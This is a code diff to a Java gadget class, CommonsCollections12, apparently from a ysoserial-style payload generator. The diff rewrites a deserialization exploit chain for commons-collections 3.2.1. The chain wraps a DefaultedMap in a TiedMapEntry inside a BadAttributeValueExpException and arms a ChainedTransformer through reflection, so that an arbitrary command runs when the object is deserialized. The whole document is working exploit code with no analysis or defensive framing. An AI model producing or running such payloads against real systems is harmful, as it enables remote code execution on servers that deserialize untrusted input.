@@ -1,31 +1,42 @@
 package com.qi4l.JYso.gadgets;
 
+import com.qi4l.JYso.gadgets.annotation.Authors;
 import com.qi4l.JYso.gadgets.annotation.Dependencies;
+import com.qi4l.JYso.gadgets.utils.Reflections;
 import com.qi4l.JYso.gadgets.utils.cc.TransformerUtil;
+
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.DefaultedMap;
 
+import javax.management.BadAttributeValueExpException;
+import java.lang.reflect.Field;
 import java.util.HashMap;
-import java.util.Hashtable;
 import java.util.Map;
 
 @Dependencies({"commons-collections:commons-collections:3.2.1"})
-public class CommonsCollections12 implements ObjectPayload<Hashtable> {
+@Authors({Authors.Jayl1n})
+public class CommonsCollections12 implements ObjectPayload<Object>{
     @Override
-    public Hashtable getObject(String command) throws Exception {
-        final Transformer[] transformers  = TransformerUtil.makeTransformer(command);
-        Map                 hashMap1      = new HashMap();
-        Map                 hashMap2      = new HashMap();
-        DefaultedMap        defaultedMap1 = (DefaultedMap) DefaultedMap.decorate(hashMap1, transformers);
-        DefaultedMap        defaultedMap2 = (DefaultedMap) DefaultedMap.decorate(hashMap2, transformers);
+    public Object getObject(String command) throws Exception {
+        final Transformer transformerChain = new ChainedTransformer(
+                new Transformer[]{ new ConstantTransformer(1) });
+        final Transformer[] transformers = TransformerUtil.makeTransformer(command);
+        final Map innerMap = new HashMap();
+        final Map defaultedmap = DefaultedMap.decorate(innerMap, transformerChain);
 
-        defaultedMap1.put("yy", 1);
-        defaultedMap2.put("zZ", 1);
-        Hashtable hashtable = new Hashtable();
-        hashtable.put(defaultedMap1, 1);
-        hashtable.put(defaultedMap2, 1);
-        defaultedMap2.remove("yy");
+        TiedMapEntry entry = new TiedMapEntry(defaultedmap, "foo");
 
-        return hashtable;
+        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
+        Field valfield = val.getClass().getDeclaredField("val");
+        valfield.setAccessible(true);
+        valfield.set(val, entry);
+
+        // arm with actual transformer chain
+        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
+
+        return val;
     }
 }
